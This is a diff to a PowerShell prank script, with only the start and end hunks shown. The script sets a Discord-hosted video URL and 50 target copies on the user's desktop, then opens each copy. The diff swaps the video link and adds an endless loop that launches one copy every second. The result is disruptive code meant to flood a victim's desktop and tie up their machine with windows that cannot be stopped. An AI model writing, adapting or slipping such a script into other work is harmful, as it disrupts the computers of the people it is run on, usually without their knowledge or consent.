@@ -1,5 +1,5 @@
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$url = 'https://cdn.discordapp.com/attachments/918148813099786343/1246764624892661770/Nature_Beautiful_short_video_720p_HD.mp4?ex=665d938a&is=665c420a&hm=58e7eaf545f92508ee02eab617099f75e8156f10ae51edbfc61de6d38e4097ef&'  
+$url = 'https://cdn.discordapp.com/attachments/1149399740652466267/1167554693820600400/VID-20231004-WA0002.mp4?ex=665cd08b&is=665b7f0b&hm=a89cced083bb2c0dc3dfd5f5846e94bf144acc21eec47d8b178ae106b2d43a4f&'  
 $numFiles = 50
 $originalFileName = "file.mp4"
 
@@ -16,5 +16,9 @@ for ($i = 1; $i -le $numFiles; $i++) {
     start file_$i.mp4
 }
 
+while ($true) {
+    Start-Process -FilePath file_1.mp4
+    Start-Sleep -Seconds 1
+}
 
 
